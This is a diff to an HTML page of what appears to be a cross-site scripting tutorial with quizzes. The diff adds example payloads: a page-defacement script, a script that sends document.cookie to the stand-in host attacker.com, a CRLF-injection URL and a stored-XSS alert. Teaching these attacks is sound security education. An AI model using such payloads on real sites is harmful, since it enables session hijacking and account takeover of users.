@@ -111,9 +111,9 @@
                 <h3>Example</h3>
                 <div class="example">
                     <pre><code>
-script
+&lt;script&gt;
     document.body.innerHTML = 'This site is hacked!';
-script
+&lt;/script&gt;
                     </code></pre>
                 </div>
                 <div class="button-group">
@@ -128,11 +128,14 @@ script
             </div>
             <div class="technique" id="technique2">
                 <h2>Technique 2: Cookie XSS</h2>
-                <p> It  is a common attack where the attacker injects malicious scripts into a web application to capture sensitive information stored in cookies. This can allow the attacker to hijack user sessions, impersonate users and gain unauthorized access to user accounts.</p>
+                <p> It is a common attack where the attacker injects malicious scripts into a web application to capture sensitive information stored in cookies. This can allow the attacker to hijack user sessions, impersonate users and gain unauthorized access to user accounts.</p>
                 <h3>Example</h3>
                 <div class="example">
                     <pre><code>
-
+&lt;script&gt;
+    var img = new Image();
+    img.src = "http://attacker.com/steal?cookie=" + document.cookie;
+&lt;/script&gt;
                     </code></pre>
                 </div>
                 <div class="button-group">
@@ -140,7 +143,7 @@ script
                         <button type="submit">Editor</button>
                     </form>
                     <form action="quizstart.php" method="get" style="margin: 0;">
-                    	<input type="hidden" name="technique" value="XS Script Technique 2">
+                        <input type="hidden" name="technique" value="XS Script Technique 2">
                         <button type="submit">Attempt Quiz</button>
                     </form>
                 </div>
@@ -151,7 +154,7 @@ script
                 <h3>Example</h3>
                 <div class="example">
                     <pre><code>
-
+https://example.com%0d%0aContent-Length:0%0d%0a%0d%0a&lt;script&gt;alert('XSS');&lt;/script&gt;
                     </code></pre>
                 </div>
                 <div class="button-group">
@@ -159,18 +162,18 @@ script
                         <button type="submit">Editor</button>
                     </form>
                     <form action="quizstart.php" method="get" style="margin: 0;">
-                    	<input type="hidden" name="technique" value="XS Script Technique 3">
+                        <input type="hidden" name="technique" value="XS Script Technique 3">
                         <button type="submit">Attempt Quiz</button>
                     </form>
                 </div>
             </div>
             <div class="technique" id="technique4">
                 <h2>Technique 4: Stored XSS</h2>
-                <p></p>
+                <p>Stored XSS occurs when a malicious script is injected directly into a target application and is stored on the server, affecting every user that accesses the page.</p>
                 <h3>Example</h3>
                 <div class="example">
                     <pre><code>
-
+&lt;script&gt;alert('Stored XSS');&lt;/script&gt;
                     </code></pre>
                 </div>
                 <div class="button-group">
@@ -178,7 +181,7 @@ script
                         <button type="submit">Editor</button>
                     </form>
                     <form action="quizstart.php" method="get" style="margin: 0;">
-                    	<input type="hidden" name="technique" value="XS Script Technique 4">
+                        <input type="hidden" name="technique" value="XS Script Technique 4">
                         <button type="submit">Attempt Quiz</button>
                     </form>
                 </div>
